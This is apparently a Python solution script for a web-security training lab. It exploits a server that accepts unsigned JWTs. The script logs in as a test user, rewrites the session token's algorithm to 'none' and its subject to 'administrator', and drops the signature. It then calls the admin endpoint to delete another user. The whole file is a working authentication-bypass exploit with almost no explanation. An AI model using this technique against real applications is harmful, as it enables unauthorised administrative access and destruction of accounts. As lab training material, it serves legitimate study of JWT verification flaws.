'''
This lab uses a JWT-based mechanism for handling sessions. The server is insecurely configured to accept unsigned JWTs.

To solve the lab, modify your session token to gain access to the admin panel at /admin, then delete the user carlos.

You can log in to your own account using the following credentials: wiener:peter 
'''

import base64
import json
import requests
from bs4 import BeautifulSoup


proxies = {
    'http': '127.0.0.1:8080',
    'https': '127.0.0.1:8080'
}

url = "https://0a9800990410789880bc1c60005c0005.web-security-academy.net"

s = requests.Session()
s.proxies.update(proxies)
s.verify = False

# login
r = s.get(f"{url}/login")
soup = BeautifulSoup(r.text)
csrf = soup.find('input', {'name':'csrf'})['value']

payload = {
    'csrf':csrf,
    'username':'wiener',
    'password':'peter'
}

s.post(f"{url}/login", data=payload)

# mutate jwt token
encoded_jwt = s.cookies.get_dict()['session']
encoded_jwt_split = encoded_jwt.split('.')

jwt_header = base64.b64decode(encoded_jwt_split[0] + '====')
jwt_data = base64.b64decode(encoded_jwt_split[1] + '====')
jwt_header = json.loads(jwt_header.decode())
jwt_data = json.loads(jwt_data.decode())

jwt_header['alg'] = 'none'
jwt_data['sub'] = 'administrator'

encoded_jwt_split[0] = base64.b64encode(json.dumps(jwt_header).encode()).decode()
encoded_jwt_split[1] = base64.b64encode(json.dumps(jwt_data).encode()).decode()
admin_jwt = ".".join(encoded_jwt_split[0:2])

# delete carlos
payload = {'username':'carlos'}
admin_jwt = admin_jwt + '.' # trailing dot required for unsigned token
s.cookies.set('session', admin_jwt)
s.get(f"{url}/admin/delete", params=payload)